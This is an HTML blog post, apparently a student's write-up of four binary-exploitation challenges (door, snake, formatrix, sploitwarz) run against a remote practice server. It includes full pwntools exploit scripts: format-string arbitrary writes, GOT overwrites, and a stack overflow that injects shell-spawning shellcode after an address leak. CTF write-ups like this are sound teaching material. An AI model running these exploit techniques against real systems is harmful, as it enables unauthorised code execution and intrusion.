@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Exploiting format string vulnerabilites, but with ASLR turned on this time">
+<meta property="og:type" content="article">
+<meta property="og:title" content="%X%x**ASLR**%x%X">
+<meta property="og:url" content="http://atharvdamle.com/aslr/index.html">
+<meta property="og:site_name" content="Atharv&#39;s Blog">
+<meta property="og:description" content="Exploiting format string vulnerabilites, but with ASLR turned on this time">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-07-05T16:10:31.582Z">
+<meta property="article:modified_time" content="2022-03-09T15:44:12.414Z">
+<meta property="article:author" content="Atharv Damle">
+<meta property="article:tag" content="Code">
+<meta property="article:tag" content="Binary Exploitation">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>%X%x**ASLR**%x%X</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/fgets-misuses/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/shellcode/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/aslr/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/aslr/&text=%X%x**ASLR**%x%X"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/aslr/&is_video=false&description=%X%x**ASLR**%x%X"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=%X%x**ASLR**%x%X&body=Check out this article: http://atharvdamle.com/aslr/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/aslr/&name=%X%x**ASLR**%x%X&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/aslr/&t=%X%x**ASLR**%x%X"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#door"><span class="toc-number">1.</span> <span class="toc-text">door</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#snake"><span class="toc-number">2.</span> <span class="toc-text">snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formatrix"><span class="toc-number">3.</span> <span class="toc-text">formatrix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sploitwarz"><span class="toc-number">4.</span> <span class="toc-text">sploitwarz</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        %X%x**ASLR**%x%X
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Atharv Damle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-05T16:10:31.582Z" itemprop="datePublished">2020-07-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="tag-link-link" href="/tags/Code/" rel="tag">Code</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="door"><a href="#door" class="headerlink" title="door"></a>door</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p><em>A pretty simple fmt string exploit. I’m not too sure why the secret phrase to the door is <strong>APES</strong> though.</em></p>
+<p>How to do it?</p>
+<ol>
+<li>Write 4 bytes onto the stack, specifically, the 2nd position on the stack.</li>
+<li>There is an if statement which compares a variable (with value ‘9447’) with ‘APES’. Now, if I edit the variable, I can get past the if.</li>
+<li>1 byte of padding: <code>b&#39;A&#39;</code> makes perfect</li>
+</ol>
+<p>Here’s some points I realized once I had completed it</p>
+<ol>
+<li>Pushing all addresses onto the stack is a great idea, which would then mean I can access addresses on the stack contiguously (unlike the way I did here)</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./door&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 4001)</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;way at &#x27;)</span><br><span class="line">ptr = int(p.readuntil(&#x27;\n&#x27;, drop=True), 16)</span><br><span class="line">ptr1 = p32(ptr)</span><br><span class="line">ptr2 = p32(ptr + 1)</span><br><span class="line">ptr3 = p32(ptr + 2)</span><br><span class="line">ptr4 = p32(ptr + 3)</span><br><span class="line"></span><br><span class="line">l1 = ptr1 + b&#x27;%60x%2$n&#x27; + ptr1 + ptr2 + b&#x27;       %6$n &#x27; + ptr3 + ptr4 + b&#x27;%236x%10$n%14x%11$n&#x27;</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;A&#x27; + l1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p><em>ASLR? PIE? Fear not, for Buffer overflows, and shellcode are here to the rescue</em></p>
+<ol>
+<li>Like the challenges from previous weeks, the idea was to pop a shell using shellcode and a buffer overflow.</li>
+<li>The only kink in the process, was that we couldn’t simply look at the disassembly to find the address of the buffer.</li>
+<li>In that case, all we needed was to leak an address on the stack, because the offset to the buffer from a value on the stack would be predictable.</li>
+<li>The pointer comes in the form of debugging information leaked when the password length is greated than the size of the buffer (0x50)</li>
+</ol>
+<p>How the code works:</p>
+<ol>
+<li>Leak an address by entering excess characters into the password field.</li>
+<li>Put shellcode to pop a shell in the buffer. Pad with nops.<ol>
+<li>The size of the buffer is roughly 0x16 bytes, but there are 0x36 bytes until the return address is overwritten. Free real estate!</li>
+</ol>
+</li>
+<li>Figuring out the offset to a position in the buffer (0x9e), we overwrite the return address with the calculated address to somewhere in our buffer</li>
+<li>???</li>
+<li>Profit</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./snake&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 4002)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;&gt; &#x27;, &#x27;3&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;passwd:&#x27;, &#x27;A&#x27;*0x50)</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;offset &#x27;)</span><br><span class="line">ptr = int(p.readuntil(&#x27;\n&#x27;, drop=True).decode(), 16)</span><br><span class="line"></span><br><span class="line"># chuck a shell</span><br><span class="line">code = asm(&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">sub esp, 0x50</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push &#123;&#125;</span><br><span class="line">push &#123;&#125;</span><br><span class="line"></span><br><span class="line">mov eax, 0xb</span><br><span class="line">mov ebx, esp</span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">mov esi, 0</span><br><span class="line"></span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;.format(u32(&#x27;//sh&#x27;), u32(&#x27;/bin&#x27;)))</span><br><span class="line"></span><br><span class="line">nops = asm(&#x27;nop&#x27;) * (0x36 - len(code))</span><br><span class="line">ret = ptr - 0x9e</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;&gt; &#x27;, &#x27;1&#x27;)</span><br><span class="line">p.sendline(nops + code + p32(ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="formatrix"><a href="#formatrix" class="headerlink" title="formatrix"></a>formatrix</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p><em>You can tell I did this one after Friday’s tutorial</em></p>
+<p>Having opened the door to format strings, we now face the GOTacle. Can we overcome this!? <em>(I haven’t watched the movie either)</em></p>
+<ol>
+<li>Pretty standard format string exploit: put an address onto the stack, write to it. Change the code flow.</li>
+<li>Only difference? The address to overwrite is of the printf function which is dynamically decided on from the got. With no RELRO, this is tRiViaL.</li>
+</ol>
+<p>How does this code work?</p>
+<ol>
+<li>Graduating from the one liner almost unreadable code, I wrote up a function to write the address of the win function into the GOT.</li>
+<li>Both the addresses of the GOT and win function can be obtained from the disassembly, since PIE is not enabled.</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./formatrix&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 4003)</span><br><span class="line"></span><br><span class="line">got = 0x8049c18</span><br><span class="line">win = 0x8048536</span><br><span class="line"></span><br><span class="line">def writeAddress(where, what):</span><br><span class="line">	win = p32(what)</span><br><span class="line">	payload = b&#x27;&#x27;</span><br><span class="line">	payload += p32(where)</span><br><span class="line">	payload += p32(where + 1)</span><br><span class="line">	payload += p32(where + 2)</span><br><span class="line">	payload += p32(where + 3)</span><br><span class="line"></span><br><span class="line">	for i in range(4):</span><br><span class="line">		ind = 3 - i</span><br><span class="line">		byte = win[ind]</span><br><span class="line">		count = ((byte - 16) + 256) % 256</span><br><span class="line">		payload += f&#x27;%&#123;count&#125;x&#x27;.encode()</span><br><span class="line">		payload += f&#x27;%&#123;ind + 3&#125;$hhn&#x27;.encode()</span><br><span class="line">		if (i != 3):</span><br><span class="line">			payload += f&#x27;%&#123;256 - count&#125;x&#x27;.encode()</span><br><span class="line"></span><br><span class="line">	return payload</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;You say: &#x27;, writeAddress(got, win))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="sploitwarz"><a href="#sploitwarz" class="headerlink" title="sploitwarz"></a>sploitwarz</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p>Combining my knowledge from the last two exploits, I write the address of the win function to the printf function in the global offset table after leaking an address exploiting a fmt string vulnerability.</p>
+<p>How does this code work?</p>
+<ol>
+<li>There’s the function from formatrix that writes addresses to places in memory. Only it has been improved to take in the offset from the top of the stack</li>
+<li>Going through the binary, I find that only one printf in the game is vulnerable to format string exploit. In <code>do_gamble</code> function where it prints out the user’s name on winning the gamble.</li>
+<li>Exploring the game, I find that the address of the GOT is the 149th element on the stack (Note, I don’t need to select this one, there are other addresses at shallower depths, but why not). This makes the exploit (or my game name) <code>%x|</code>. The pipe is for easier extraction.</li>
+<li>Winning the gamble<ol>
+<li>Finding and editing the correct choice seems very hard without leaking data before, and getting the correct choice is the way to leak data. Infinite loop?</li>
+<li>Brute force is the best force. Since the gamble lets me spend 0.0000001 (basically a very low number) of btc, the odds of winning are very pretty good. Plus I think the odds favor the higher numbers, but I don’t worry about it too much.</li>
+</ol>
+</li>
+<li>Once We are at the printf that leaks information, we can obtain the address of the GOT from it. Then calculate the address of the win function to use. Finally using the function from (1) to generate the payload.</li>
+<li>Set the name as the new payload by changing the user’s handle.</li>
+<li>To execute the new payload, you need to win the gamble again, so bruteforce!</li>
+<li><code>cat flag</code></li>
+</ol>
+<p>Things to think about&#x2F;Issues faced:</p>
+<ol>
+<li>Finding the exploit: Unlike the last exploits, the entered text is not reflected back immediately, and there are some time and steps between the payload is entered and it takes effect. I took a while figuring this one out.</li>
+<li>Reading&#x2F;Writing: Because I read in so much data, (perhaps issues in buffering or the game) cause the output to be printed out multiple times. I fixed this one by cleaning the buffer regularly, which would remove any data that was not read in.</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def writeAddress(offset, where, what):</span><br><span class="line">	win = p32(what)</span><br><span class="line">	payload = b&#x27;&#x27;</span><br><span class="line">	payload += p32(where)</span><br><span class="line">	payload += p32(where + 1)</span><br><span class="line">	payload += p32(where + 2)</span><br><span class="line">	payload += p32(where + 3)</span><br><span class="line">	for i in range(4):</span><br><span class="line">		ind = 3 - i</span><br><span class="line">		byte = win[ind]</span><br><span class="line">		count = ((byte - 16) + 256) % 256</span><br><span class="line">		payload += f&#x27;%&#123;count&#125;x&#x27;.encode()</span><br><span class="line">		payload += f&#x27;%&#123;ind + offset&#125;$hhn&#x27;.encode()</span><br><span class="line">		if (i != 3):</span><br><span class="line">			payload += f&#x27;%&#123;256 - count&#125;x&#x27;.encode()</span><br><span class="line">	return payload</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./sploitwarz&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 4004)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;%149$x|&#x27;</span><br><span class="line">p.readuntil(&#x27;handle?&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line"># brute force the gamble</span><br><span class="line">nline=&#x27;&#x27;</span><br><span class="line">while(True):</span><br><span class="line">	p.clean()</span><br><span class="line">	p.sendlineafter(&#x27;What will you do? &#x27;, &#x27;g&#x27;)</span><br><span class="line">	p.sendline(&#x27;0.0000001&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;&gt; &#x27;, &#x27;5&#x27;)</span><br><span class="line">	f = p.readline().decode()</span><br><span class="line">	if (&#x27;OPTIONS&#x27; in f):</span><br><span class="line">		continue</span><br><span class="line">	nline = p.readline().decode()</span><br><span class="line">	if (&#x27;Well done&#x27; in nline):</span><br><span class="line">		# next line contains leakage</span><br><span class="line">		break</span><br><span class="line">	p.readuntil(&#x27;any key&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;continue...&#x27;, &#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">r = nline.split(&#x27;|&#x27;)</span><br><span class="line">got = int(&#x27;0x&#x27; + r[0].split(&#x27; &#x27;)[-1], 16)</span><br><span class="line">win = got - 10852</span><br><span class="line">got = got + 0x10</span><br><span class="line"></span><br><span class="line">p.clean()</span><br><span class="line">p.sendline(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">p.clean()</span><br><span class="line"># dummy input</span><br><span class="line">p.sendline(&#x27;c&#x27;)</span><br><span class="line"></span><br><span class="line">p.clean()</span><br><span class="line">p.sendline(&#x27;c&#x27;)</span><br><span class="line">p.sendline(writeAddress(5, got, win))</span><br><span class="line"></span><br><span class="line"># exploit</span><br><span class="line">nline=&#x27;&#x27;</span><br><span class="line">while(True):</span><br><span class="line">	p.sendlineafter(&#x27;What will you do? &#x27;, &#x27;g&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;: &#x27;, &#x27;0.0000001&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;&gt; &#x27;, &#x27;5&#x27;)</span><br><span class="line">	f = p.readline()</span><br><span class="line">	if (not p.can_read()):</span><br><span class="line">		break</span><br><span class="line">	nline = p.readline()</span><br><span class="line">	if (b&#x27;Well done&#x27; in nline):</span><br><span class="line">		break</span><br><span class="line">	p.clean()</span><br><span class="line">	p.sendline(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#door"><span class="toc-number">1.</span> <span class="toc-text">door</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#snake"><span class="toc-number">2.</span> <span class="toc-text">snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formatrix"><span class="toc-number">3.</span> <span class="toc-text">formatrix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sploitwarz"><span class="toc-number">4.</span> <span class="toc-text">sploitwarz</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/aslr/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/aslr/&text=%X%x**ASLR**%x%X"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/aslr/&is_video=false&description=%X%x**ASLR**%x%X"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=%X%x**ASLR**%x%X&body=Check out this article: http://atharvdamle.com/aslr/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/aslr/&title=%X%x**ASLR**%x%X"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/aslr/&name=%X%x**ASLR**%x%X&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/aslr/&t=%X%x**ASLR**%x%X"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Atharv Damle
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
